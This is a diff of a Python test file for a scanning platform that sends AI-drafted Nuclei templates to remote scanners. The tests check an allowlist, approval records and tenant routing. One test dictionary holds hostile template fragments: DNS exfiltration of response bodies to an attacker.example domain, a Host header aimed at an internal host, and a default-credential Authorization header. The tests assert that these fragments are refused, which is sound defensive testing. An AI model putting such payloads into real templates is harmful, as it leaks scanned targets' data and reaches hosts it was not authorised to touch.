@@ -26,7 +26,7 @@ from agentapi import ai_checks, sentinel_broker, sentinel_contract
 from agentapi import sentinel_dispatch as dispatch
 from agentapi.models import SentinelTask
 from agentapi.services import ApiError, Ctx
-from cveFeed import os_detection, path_probe, templategen, validation
+from cveFeed import check_allowlist, os_detection, path_probe, templategen, validation
 from reNgine import resources
 from tests.fake_scanner import FakeScanner
 from tests import test_sentinel_v3_kinds as v3
@@ -54,6 +54,21 @@ def echo(outcomes=None, **fields):
 
 
 class Base(v3.StageBase):
+    def setUp(self):
+        super().setUp()
+        # the approval records a check for a Sentinel other than the built-in scanner is bound to (review D3): TEMPLATE is the AI's draft for a CVE
+        # matched on a host of this project, and the same text is also a promoted (valid, fixture-reviewed) check; HOSTS are this project's hosts
+        from cveFeed.models import CVEEntry, CVEMatch, GeneratedTemplate
+        from startScan.models import Subdomain
+        self.cve = CVEEntry.objects.create(cve_id='CVE-2024-0001')
+        self.subs = [Subdomain.objects.create(name=name, target_domain=self.domain) for name in ('www.rt.test', 'api.rt.test')]
+        CVEMatch.objects.create(cve_entry=self.cve, subdomain=self.subs[0])
+        self.draft = GeneratedTemplate.objects.create(cve_entry=self.cve, template_id='cve-2024-0001-example', yaml=TEMPLATE,
+                                                      status=GeneratedTemplate.STATUS_DRAFT)
+        self.promoted = GeneratedTemplate.objects.create(cve_entry=self.cve, template_id='cve-2024-0001-example', yaml=TEMPLATE,
+                                                         status=GeneratedTemplate.STATUS_VALID, positive_fixture_verified_at=timezone.now(),
+                                                         positive_fixture_source='reviewed fixture')
+
     def external(self, kinds=('nuclei_validate', 'path_probe'), **kw):
         return FakeScanner(kinds=list(kinds), external=True, name=kw.pop('name', 'own-sentinel'), **kw).start_for(self)
 
@@ -230,7 +245,8 @@ class HandOutTests(Base):
         fake = self.external()
         task = self.queued(self.target())
         self.assertEqual(self.claim(fake)['id'], task.pk)
-        self.assertEqual(sentinel_broker.approved_check(self.ctx(fake), task.pk), {'task_id': task.pk, 'template_sha256': SHA, 'mode': 'validate'})
+        self.assertEqual(sentinel_broker.approved_check(self.ctx(fake), task.pk), {'task_id': task.pk, 'template_sha256': SHA, 'mode': 'validate',
+                                                                                    'targets': []})
 
     def test_no_answer_for_a_task_not_held_altered_or_of_another_sentinel(self):
         fake = self.external()
@@ -339,6 +355,208 @@ class PathSurveyTests(Base):
         self.assertFalse(dispatch.os_reliable(dispatch.Result({'os_reliable': False}, agent_id=other.agent.pk)))
 
 
+# ============================================================================== second security pass (review D1, D3, D4, D7, D8)
+
+class AllowlistNeverSentTests(Base):
+    """D1, D2: a draft that passes the static gate and the read-only rules but breaks the whole-document allowlist never becomes a task for a
+    Sentinel, and a task holding one is never handed out (the broker checks again)."""
+    TAIL = '\n    matchers:\n      - type: word\n        words:\n          - "example-banner"'
+    HOSTILE = {
+        'resolve_in_header': '\n    headers:\n      X-A: "{{resolve(\'x.attacker.example\',\'a\')}}"',
+        'nested_resolve_in_header': '\n    headers:\n      X-A: "{{to_lower(concat(\'a\', resolve(\'x.attacker.example\',\'a\')))}}"',
+        'resolve_in_dsl_extractor': '\n    extractors:\n      - type: dsl\n        dsl:\n          - "resolve(concat(hex_encode(body), \'.attacker.example\'), \'a\')"',
+        'jarm_in_dsl_extractor': '\n    extractors:\n      - type: dsl\n        dsl:\n          - "jarm(\'192.0.2.1:443\')"',
+        'host_header': '\n    headers:\n      Host: internal.corp.local',
+        'authorization_header': '\n    headers:\n      Authorization: "Basic YWRtaW46YWRtaW4="',
+        'duplicate_key': '\n    method: GET',
+    }
+
+    def hostile(self):
+        from cveFeed.models import GeneratedTemplate
+        texts = {}
+        for name, extra in self.HOSTILE.items():
+            text = TEMPLATE[:TEMPLATE.index('\n    matchers:')] + extra + self.TAIL
+            GeneratedTemplate.objects.create(cve_entry=self.cve, template_id='cve-2024-0001-example', yaml=text, status=GeneratedTemplate.STATUS_DRAFT)
+            ok, why = templategen.static_check(text)
+            self.assertTrue(ok, f'{name}: {why}')  # the old gates pass it: the allowlist is what refuses it
+            self.assertEqual(validation.readonly_problem(text), '', name)
+            texts[name] = text
+        return texts
+
+    def test_a_hostile_draft_is_never_sent_to_a_sentinel(self):
+        fake = self.external(responders={'nuclei_validate': echo()})
+        for name, text in self.hostile().items():
+            with self.subTest(case=name):
+                valid, output, _fixture, _note = dispatch.try_nuclei_validate(text, self.project)
+                self.assertFalse(valid)
+                self.assertIn('not validated', output)
+        self.assertFalse(SentinelTask.objects.filter(kind='nuclei_validate').exists())
+        self.assertEqual(fake.served, [])
+
+    def test_a_task_holding_one_is_never_handed_out(self):
+        fake = self.external()
+        for name, text in self.hostile().items():
+            with self.subTest(case=name):
+                task = self.queued({'mode': 'validate', 'template': text, 'template_sha256': ai_checks.digest(text)})
+                self.assertIsNone(self.claim(fake))
+                task.refresh_from_db()
+                self.assertEqual(task.status, 'expired')
+
+
+class ApprovalBindingTests(Base):
+    """D3: for a Sentinel other than the built-in scanner a check is sent and handed out only while an approval record holds exactly its text, for
+    the task's own tenant and hosts; arbitrary read-only text and a withdrawn approval never are."""
+    ROGUE = TEMPLATE.replace('example-banner', 'rogue-banner')  # read-only, own target, on the allowlist: but no row or file approves it
+
+    def test_read_only_text_no_record_approves_is_never_sent_or_handed_out(self):
+        fake = self.external(responders={'nuclei_validate': echo()})
+        self.assertEqual(ai_checks.external_problem(self.ROGUE), '')
+        out = dispatch.try_template_test(self.ROGUE, HOSTS, self.project.id)
+        self.assertTrue(all('no approval holds exactly this text' in o['error'] for o in out), out)
+        valid, output = templategen.validate_anywhere(self.ROGUE, self.project)
+        self.assertFalse(valid)
+        self.assertIn('no AI draft holds exactly this text', output)
+        self.assertEqual(fake.served, [])
+        for mode in ('validate', 'test'):
+            with self.subTest(mode=mode):
+                task = self.queued(ai_checks.target(mode, self.ROGUE, HOSTS))
+                self.assertIsNone(self.claim(fake))
+                task.refresh_from_db()
+                self.assertEqual(task.status, 'expired')
+                self.assertIn('no ', task.error)
+
+    def test_a_check_whose_approval_was_withdrawn_after_dispatch_is_never_handed_out(self):
+        from cveFeed.models import GeneratedTemplate
+        fake = self.external()
+        for mode, row in (('test', self.promoted), ('validate', self.draft)):
+            with self.subTest(mode=mode):
+                task = self.queued(ai_checks.target(mode, TEMPLATE, HOSTS))
+                self.assertEqual(ai_checks.task_problem(task, builtin=False), '')  # approved when it was made
+                GeneratedTemplate.objects.filter(pk=row.pk).update(status=GeneratedTemplate.STATUS_INVALID)  # withdrawn before it was claimed
+                self.assertIsNone(self.claim(fake))
+                task.refresh_from_db()
+                self.assertEqual(task.status, 'expired')
+
+    def test_the_answer_is_withdrawn_with_the_approval_while_the_sentinel_holds_the_check(self):
+        from cveFeed.models import GeneratedTemplate
+        fake = self.external()
+        task = self.queued(ai_checks.target('test', TEMPLATE, HOSTS))
+        self.assertEqual(self.claim(fake)['id'], task.pk)
+        self.assertEqual(sentinel_broker.approved_check(self.ctx(fake), task.pk)['targets'], sorted(HOSTS))
+        GeneratedTemplate.objects.filter(pk=self.promoted.pk).update(status=GeneratedTemplate.STATUS_INVALID)
+        with self.assertRaises(ApiError) as caught:
+            sentinel_broker.approved_check(self.ctx(fake), task.pk)
+        self.assertEqual(caught.exception.status, 404)
+
+    def test_a_test_check_runs_only_on_hosts_of_its_own_project(self):
+        fake = self.external(responders={'nuclei_validate': echo()})
+        out = dispatch.try_template_test(TEMPLATE, ['https://www.rt.test', 'https://elsewhere.example.test'], self.project.id)
+        self.assertTrue(all('is not a host of the project' in o['error'] for o in out), out)
+        self.assertEqual(fake.served, [])
+        task = self.queued(ai_checks.target('test', TEMPLATE, ['https://www.rt.test', 'https://elsewhere.example.test']))  # targets edited
+        self.assertIsNone(self.claim(fake))
+        task.refresh_from_db()
+        self.assertEqual(task.status, 'expired')
+
+    def test_a_draft_is_checked_only_for_a_project_that_owns_a_target_of_its_cve(self):
+        from cveFeed.models import CVEMatch
+        self.external(responders={'nuclei_validate': echo()})
+        CVEMatch.objects.all().delete()  # the draft's CVE matched no host of this project
+        with self.assertRaises(resources.ScannerUnavailable):
+            dispatch.try_nuclei_validate(TEMPLATE, self.project)
+        task = self.queued(ai_checks.target('validate', TEMPLATE))
+        self.assertIn('not for a target of the project', ai_checks.task_problem(task, builtin=False))
+
+    def test_an_installed_template_file_is_an_approval_of_exactly_its_text(self):
+        import os
+        import tempfile
+        installed = TEMPLATE.replace('cve-2024-0001-example', 'CVE-2024-0002')
+        with tempfile.TemporaryDirectory() as root:
+            path = os.path.join(root, 'CVE-2024-0002.yaml')
+            with open(path, 'w', encoding='utf-8') as handle:
+                handle.write(installed)
+            with mock.patch.object(templategen, 'find_existing_template', return_value=[path]), \
+                    mock.patch.object(templategen, 'TEMPLATES_ROOT', root), mock.patch.object(validation, 'all_templates_allowed', return_value=False):
+                self.assertEqual(ai_checks.binding_problem('test', installed, self.project.id, HOSTS), '')
+                self.assertIn('no approval', ai_checks.binding_problem('test', installed + '# edited\n', self.project.id, HOSTS))
+                os.unlink(path)  # removed from the template directory: withdrawn
+                self.assertIn('no approval', ai_checks.binding_problem('test', installed, self.project.id, HOSTS))
+
+
+class TenantRoutingTests(Base):
+    """D7, D8: a draft goes only to a Sentinel of a project that owns a target of its CVE, never to another tenant's (the oldest project's Sentinel
+    included); with none it waits. A test check of one tenant is never handed to another tenant's Sentinel."""
+
+    def other_tenant(self):
+        from dashboard.models import Org, Project
+        org = Org.objects.create(name='Other', slug='other-org')
+        return Project.objects.create(name='Older', slug='aaa-older', insert_date=timezone.now(), org=org)
+
+    def test_with_no_project_a_draft_never_goes_to_another_tenants_sentinel(self):
+        older = self.other_tenant()  # the oldest project, with its own Sentinel, and no target of the draft's CVE
+        theirs = self.external(name='their-sentinel', responders={'nuclei_validate': echo()},
+                               scope={'orgs': [], 'projects': [older.slug], 'hosts': []})
+        with self.assertRaises(resources.ScannerUnavailable):
+            dispatch.try_nuclei_validate(TEMPLATE, None)  # the owning project has no Sentinel: it waits
+        self.assertEqual(theirs.served, [])
+        ours = self.external(name='our-sentinel', responders={'nuclei_validate': echo()},
+                             scope={'orgs': [], 'projects': [self.project.slug], 'hosts': []})
+        valid, _output, _fixture, _note = dispatch.try_nuclei_validate(TEMPLATE, None)
+        self.assertTrue(valid)
+        self.assertEqual((len(ours.served), len(theirs.served)), (1, 0))
+        self.assertEqual(SentinelTask.objects.get(kind='nuclei_validate').project_id, self.project.id)
+
+    def test_a_draft_named_for_another_tenant_is_not_filed_there(self):
+        older = self.other_tenant()
+        theirs = self.external(name='their-sentinel', responders={'nuclei_validate': echo()},
+                               scope={'orgs': [], 'projects': [older.slug], 'hosts': []})
+        with self.assertRaises(resources.ScannerUnavailable):
+            dispatch.try_nuclei_validate(TEMPLATE, older)
+        self.assertEqual(theirs.served, [])
+
+    def test_another_tenants_sentinel_is_never_handed_a_check_of_this_project(self):
+        older = self.other_tenant()
+        theirs = self.external(name='their-sentinel', scope={'orgs': [], 'projects': [older.slug], 'hosts': []})
+        for mode in ('validate', 'test'):
+            with self.subTest(mode=mode):
+                task = self.queued(ai_checks.target(mode, TEMPLATE, HOSTS))
+                self.assertEqual(sentinel_broker.effective(theirs.agent).refusal(task)[0], 'scope')
+                self.assertIsNone(self.claim(theirs))
+                task.delete()
+        out = dispatch.try_template_test(TEMPLATE, HOSTS, self.project.id)
+        self.assertTrue(all(o.get('error') for o in out), out)  # nobody could take it: not tested, stays due
+        self.assertEqual(theirs.served, [])
+
+
+class DraftRowTests(Base):
+    """D3: a new AI draft is a row before its first check, so the check a Sentinel runs is bound to that row; a draft whose first check never
+    finished is checked again by the automatic validator."""
+
+    def test_the_first_check_of_a_new_draft_runs_on_its_own_row(self):
+        from cveFeed import templatevalidate
+        from cveFeed.models import AIJob, GeneratedTemplate
+        GeneratedTemplate.objects.all().delete()
+        fake = self.external(responders={'nuclei_validate': echo()})
+        job = AIJob.objects.create(kind='template_generation', dedupe='t', context={'cve': self.cve.pk, 'project': self.project.id})
+        seen = {}
+        real = dispatch.try_nuclei_validate
+
+        def spy(text, project=None):
+            seen['rows'] = list(GeneratedTemplate.objects.filter(yaml=text).values_list('status', 'validation_stage'))
+            return real(text, project)
+        with mock.patch.object(dispatch, 'try_nuclei_validate', side_effect=spy):
+            templategen.job_answer(job, TEMPLATE)
+        self.assertEqual(seen['rows'], [(GeneratedTemplate.STATUS_DRAFT, 'syntax')])
+        row = GeneratedTemplate.objects.get()
+        self.assertEqual((row.status, row.validation_stage, row.validation_next_at), (GeneratedTemplate.STATUS_DRAFT, '', None))
+        self.assertEqual(len(fake.served), 1)
+        row.validation_stage = 'syntax'
+        row.save(update_fields=['validation_stage'])
+        with mock.patch.object(templatevalidate, '_sentinel_gate', return_value='retry') as gate:
+            self.assertEqual(templatevalidate.step(row), 'retry')
+        gate.assert_called_once()
+
+
 # ============================================================================== one read-only rule on both sides
 
 class SameVerdictTests(SimpleTestCase):
@@ -351,5 +569,23 @@ class SameVerdictTests(SimpleTestCase):
             with self.subTest(case=case['name']):
                 self.assertEqual(validation.readonly_problem(case['template']) == '', case['read_only'])
                 self.assertEqual(checks.readonly_problem(case['template']) == '', case['read_only'])
-                self.assertEqual(ai_checks.external_problem(case['template']) == '', case['read_only'] and case['own_target'])
-                self.assertEqual(checks.check_problem(case['template']) == '', case['read_only'] and case['own_target'])
+                self.assertEqual(ai_checks.external_problem(case['template']) == '', case['read_only'] and case['own_target'] and case['sentinel'])
+                self.assertEqual(checks.check_problem(case['template']) == '', case['read_only'] and case['own_target'] and case['sentinel'])
+                self.assertEqual(check_allowlist.allowlist_problem(case['template']) == '' or not case['sentinel'], True)
+
+    def test_the_server_and_the_sentinel_allow_the_same_names_keys_and_headers(self):
+        from cvengine_scanner import check_allowlist as library
+        for name in ('TOP_KEYS', 'INFO_KEYS', 'CLASSIFICATION_KEYS', 'BLOCK_KEYS', 'INPUT_KEYS', 'MATCHER_KEYS', 'MATCHER_TYPES', 'EXTRACTOR_KEYS',
+                     'EXTRACTOR_TYPES', 'METHODS', 'DNS_TYPES', 'TLS_VERSIONS', 'PLACEHOLDERS', 'RESPONSE_NAMES', 'PARTS', 'FUNCTIONS', 'LITERALS',
+                     'FORBIDDEN_HEADERS', 'MAX_HEADERS', 'MAX_EXPRESSION'):
+            with self.subTest(table=name):
+                self.assertEqual(getattr(check_allowlist, name), getattr(library, name))
+
+    def test_no_hostile_case_reaches_a_sentinel_from_the_server(self):
+        from cvengine_scanner import contract as library
+        corpus = json.loads((library.FIXTURES / 'checks' / 'corpus.json').read_text(encoding='utf-8'))['cases']
+        hostile = [c for c in corpus if c['read_only'] and c['own_target'] and not c['sentinel']]
+        self.assertGreaterEqual(len(hostile), 40)
+        for case in hostile:
+            with self.subTest(case=case['name']):
+                self.assertTrue(ai_checks.external_problem(case['template']).startswith('template not validated: '))
